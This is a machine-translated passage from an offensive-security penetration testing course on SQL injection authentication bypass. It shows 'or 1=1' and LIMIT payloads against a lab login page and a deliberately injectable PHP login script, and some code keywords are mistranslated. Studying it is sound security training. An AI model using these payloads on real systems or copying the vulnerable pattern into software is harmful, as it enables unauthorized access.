<div style="position:absolute;top:3429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：无效查询：您的 SQL 语法有错误；</font><font style="vertical-align: inherit;">检查 cor 的手册</font></font></nobr></div>
<div style="position:absolute;top:3446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">响应您的 MariaDB 服务器版本以在“password123”附近使用正确的语法</font></font></nobr></div>
<div style="position:absolute;top:3463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">' 在 C:\xampp\htdocs\login.php 第 1 行的第 20 行</font></font></nobr></div>
<div style="position:absolute;top:3482;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 317 - 示例 SQL 错误消息</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:3611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">286 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Black-box_testing</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:3739;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 4 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:3772;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:4849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:4849;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:4849;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">324</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此错误消息告诉我们几件事：我们在 SQL 语句中导致了错误，数据库</font></font></nobr></div>
<div style="position:absolute;top:3887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件是 MariaDB，服务器在 Windows 上运行 XAMPP。</font><font style="vertical-align: inherit;">让我们看看我们如何</font></font></nobr></div>
<div style="position:absolute;top:3906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用此漏洞访问管理页面。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:3941;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.3 认证绕过</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证绕过是利用 SQL 注入漏洞的经典示例</font></font></nobr></div>
<div style="position:absolute;top:3995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">展示了恶意用户玩弄你的数据库的危险。</font><font style="vertical-align: inherit;">考虑代码示例</font></font></nobr></div>
<div style="position:absolute;top:4014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一节。</font><font style="vertical-align: inherit;">如果我们能够将我们自己的代码注入到 SQL 语句中，我们将如何</font></font></nobr></div>
<div style="position:absolute;top:4033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改对我们有利的查询？</font></font></nobr></div>
<div style="position:absolute;top:4066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是正常用例：合法用户将其用户名和密码提交给</font></font></nobr></div>
<div style="position:absolute;top:4086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用。</font><font style="vertical-align: inherit;">应用程序使用这些值查询数据库。</font><font style="vertical-align: inherit;">SQL 语句使用一个</font></font></nobr></div>
<div style="position:absolute;top:4105;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">where</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子句</font><font style="vertical-align: inherit;">中的</font><i><font style="vertical-align: inherit;">和</font></i><font style="vertical-align: inherit;">逻辑运算符</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">因此，数据库将只返回具有</font></font></nobr></div>
<div style="position:absolute;top:4124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有给定用户名和匹配密码的用户。</font></font></nobr></div>
<div style="position:absolute;top:4157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后，正常登录的 SQL 查询如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from users where name = ' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ' and password = ' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jones</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ';</font></font></nobr></div>
<div style="position:absolute;top:4211;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 318 - 示例登录查询</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们控制作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$user</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传入的值</font><font style="vertical-align: inherit;">，我们可以通过提交来颠覆查询的逻辑</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:4261;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tom' or 1=1;#</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为我们的用户名，它会创建一个这样的查询：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from users where name = ' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tom' or 1=1;#</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ' and password = 'jones';</font></font></nobr></div>
<div style="position:absolute;top:4314;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 319 - 带有 SQL 注入负载的示例登录查询</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">井号 (#) 是 MySQL/MariaDB 中的注释标记。</font><font style="vertical-align: inherit;">它有效地去除了其余部分</font></font></nobr></div>
<div style="position:absolute;top:4363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的声明，所以我们留下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from users where name = 'tom' or 1=1;</font></font></nobr></div>
<div style="position:absolute;top:4417;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 320 - 执行的示例查询</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将其解释为“向我显示名称为 tom 或 where 的用户的所有列和行</font></font></nobr></div>
<div style="position:absolute;top:4466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一等于一”。</font><font style="vertical-align: inherit;">由于“1=1”条件的计算结果始终为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">true</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，因此将返回所有行。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:4485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简而言之，通过引入</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">or</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子句和“1=1”条件，该语句将返回所有记录</font></font></nobr></div>
<div style="position:absolute;top:4505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表，创建一个有效的“密码检查”。</font></font></nobr></div>
<div style="position:absolute;top:4537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这足以绕过身份验证吗？</font><font style="vertical-align: inherit;">这取决于。</font><font style="vertical-align: inherit;">我们已经操纵查询返回所有</font></font></nobr></div>
<div style="position:absolute;top:4557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户表中的记录。</font><font style="vertical-align: inherit;">应用程序代码决定接下来会发生什么。</font><font style="vertical-align: inherit;">一些</font></font></nobr></div>
<div style="position:absolute;top:4576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编程语言具有查询数据库并期望获得单个记录的功能。</font><font style="vertical-align: inherit;">如果</font></font></nobr></div>
<div style="position:absolute;top:4595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些函数得到不止一行，它们会产生错误。</font><font style="vertical-align: inherit;">其他函数可能会处理</font></font></nobr></div>
<div style="position:absolute;top:4615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多行就好了。</font><font style="vertical-align: inherit;">如果没有应用程序的源代码或</font></font></nobr></div>
<div style="position:absolute;top:4634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用试错法。</font></font></nobr></div>
<div style="position:absolute;top:4667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果当我们的有效负载返回多行时确实遇到错误，我们可以指示查询</font></font></nobr></div>
<div style="position:absolute;top:4686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 LIMIT 语句返回固定数量的记录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from users where name = 'tom' or 1=1 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LIMIT 1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ;#</font></font></nobr></div>
<div style="position:absolute;top:4741;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 321 - 使用 LIMIT 语句的示例查询 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:4927;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="5"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4960;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:6037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:6037;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:6037;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">325</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了试验这些查询以及它们对数据库的影响，我们可以直接连接</font></font></nobr></div>
<div style="position:absolute;top:5075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 MySQL 用户名和密码访问我们 Windows 10 实验室机器上的数据库</font></font></nobr></div>
<div style="position:absolute;top:5094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root/root 并直接发出 SQL 语句：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\xampp\mysql\bin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysql -u root -p root</font></font></font></b></nobr></div>
<div style="position:absolute;top:5146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:5180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(无)]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 webappdb</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ;</font></font></nobr></div>
<div style="position:absolute;top:5197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库已更改</font></font></nobr></div>
<div style="position:absolute;top:5231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [webappdb]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从用户中选择 *</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ;</font></font></nobr></div>
<div style="position:absolute;top:5248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+---------+--------------+</font></font></nobr></div>
<div style="position:absolute;top:5265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">身份证 | </font><font style="vertical-align: inherit;">用户名 | </font><font style="vertical-align: inherit;">密码 |</font></font></nobr></div>
<div style="position:absolute;top:5282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+---------+--------------+</font></font></nobr></div>
<div style="position:absolute;top:5299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1 | </font><font style="vertical-align: inherit;">管理员 | </font><font style="vertical-align: inherit;">p@ssw0rd |</font></font></nobr></div>
<div style="position:absolute;top:5316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2 | </font><font style="vertical-align: inherit;">拼图| </font><font style="vertical-align: inherit;">步法诱惑|</font></font></nobr></div>
<div style="position:absolute;top:5333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+---------+--------------+</font></font></nobr></div>
<div style="position:absolute;top:5350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 行（0.01 秒）</font></font></nobr></div>
<div style="position:absolute;top:5384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [webappdb]&gt;</font></font></nobr></div>
<div style="position:absolute;top:5403;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 322 - 连接到 MariaDB 实例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们针对我们的示例应用程序尝试此操作，并尝试在没有有效凭据的情况下登录。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:5452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该能够通过包含“or 1=1”来欺骗应用程序让我们在没有密码的情况下进入</font></font></nobr></div>
<div style="position:absolute;top:5471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">限制 1；” </font><font style="vertical-align: inherit;">子句并注释掉查询的其余部分。</font><font style="vertical-align: inherit;">我们不知道具体查询的是什么</font></font></nobr></div>
<div style="position:absolute;top:5491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看起来像，但“or”子句将评估为真，因此导致查询返回记录。</font></font></nobr></div>
<div style="position:absolute;top:5510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将包含“LIMIT”子句以保持简单并且只返回一条记录。</font><font style="vertical-align: inherit;">我们将提交我们的</font></font></nobr></div>
<div style="position:absolute;top:5529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“用户名”字段中的有效负载：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5847;left:358"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 160：利用 SQL 注入 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:6115;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6148;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:7225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:7225;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:7225;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">326</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:6238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.3.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们成功地操作了查询，我们应该得到一个有效的经过身份验证的会话：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6577;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 161：获得对管理页面的访问权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font><font style="vertical-align: inherit;">我们绕过了这个应用程序的登录！</font><font style="vertical-align: inherit;">让我们检查源代码，以便我们完全理解</font></font></nobr></div>
<div style="position:absolute;top:6627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里发生了什么：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11 &lt;?php</font></font></nobr></div>
<div style="position:absolute;top:6679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12 session_start();</font></font></nobr></div>
<div style="position:absolute;top:6696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13 包含“database.php”；</font></font></nobr></div>
<div style="position:absolute;top:6713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14 如果（！空（$_POST））{</font></font></nobr></div>
<div style="position:absolute;top:6730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15 if (isset($_POST['username']) &amp;&amp; isset($_POST['password']) ) {</font></font></nobr></div>
<div style="position:absolute;top:6746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:6746;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sql="select * from users where username ='" 。</font><font style="vertical-align: inherit;">$_POST['用户名'] 。</font></font></b></nobr></div>
<div style="position:absolute;top:6763;left:238"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"' 和密码 = '" 。</font><font style="vertical-align: inherit;">$_POST['密码'] 。</font><font style="vertical-align: inherit;">"'";</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17</font></font></nobr></div>
<div style="position:absolute;top:6797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18    </font></font></nobr></div>
<div style="position:absolute;top:6797;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$result = $conn-&gt;query($sql);</font></font></nobr></div>
<div style="position:absolute;top:6814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19    </font></font></nobr></div>
<div style="position:absolute;top:6814;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果（！$结果）{</font></font></nobr></div>
<div style="position:absolute;top:6831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20    </font></font></nobr></div>
<div style="position:absolute;top:6831;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">trigger_error("无效查询：" . $conn-&gt;error);</font></font></nobr></div>
<div style="position:absolute;top:6848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21    </font></font></nobr></div>
<div style="position:absolute;top:6848;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:6865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:6865;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if( $result-&gt;num_rows == 1 ) {</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23    </font></font></nobr></div>
<div style="position:absolute;top:6882;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$_SESSION['user'] = $_POST['username'];</font></font></nobr></div>
<div style="position:absolute;top:6899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24    </font></font></nobr></div>
<div style="position:absolute;top:6899;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">header("位置：admin.php");</font></font></nobr></div>
<div style="position:absolute;top:6916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25    </font></font></nobr></div>
<div style="position:absolute;top:6916;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">} 别的 {</font></font></nobr></div>
<div style="position:absolute;top:6933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26    </font></font></nobr></div>
<div style="position:absolute;top:6933;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "&lt;div class=\"alert alert-danger\"&gt;用户名或密码错误&lt;/div&gt;";</font></font></nobr></div>
<div style="position:absolute;top:6950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27    </font></font></nobr></div>
<div style="position:absolute;top:6950;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:6967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28 }</font></font></nobr></div>
<div style="position:absolute;top:6984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29</font></font></nobr></div>
<div style="position:absolute;top:7001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30 }</font></font></nobr></div>
<div style="position:absolute;top:7018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">31 ?&gt;</font></font></nobr></div>
<div style="position:absolute;top:7037;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 323 - login.php 的代码摘录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 323 的第 16 行，</font><font style="vertical-align: inherit;">通过 POST 提交</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">的值</font></font></nobr></div>
<div style="position:absolute;top:7086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接添加到包含 SQL 查询的字符串中。</font><font style="vertical-align: inherit;">通常，查询只会返回</font></font></nobr></div>
<div style="position:absolute;top:7105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提交有效用户名和相关密码时的结果。</font><font style="vertical-align: inherit;">我们的 SQL 注入负载</font></font></nobr></div>
<div style="position:absolute;top:7125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“转义”出预期的查询并注入一个“OR”子句，这会导致查询返回</font></font></nobr></div>
<div style="position:absolute;top:7144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使用户名和密码不正确也行。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:7303;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="7"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 7 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:7336;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:8413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:8413;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:8413;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">327</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 行检查查询结果是否为一行。</font><font style="vertical-align: inherit;">如果提交的用户名或密码无效，</font></font></nobr></div>
<div style="position:absolute;top:7451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询不会返回任何行。</font><font style="vertical-align: inherit;">如果提交了有效的用户名和密码，则查询将</font></font></nobr></div>
<div style="position:absolute;top:7470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回一行。</font><font style="vertical-align: inherit;">应用程序的开发人员认为这足以确定用户是否应该</font></font></nobr></div>
<div style="position:absolute;top:7490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行身份验证，因为第 23 行将用户名存储在会话状态中，第 24 行重定向用户</font></font></nobr></div>
<div style="position:absolute;top:7509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到 admin.php。</font></font></nobr></div>
<div style="position:absolute;top:7542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们必须包含“LIMIT”子句来处理第 22 行的检查。攻击者不会</font></font></nobr></div>
<div style="position:absolute;top:7561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不用看源代码就一定知道这一点，这就是为什么实验非常重要</font></font></nobr></div>
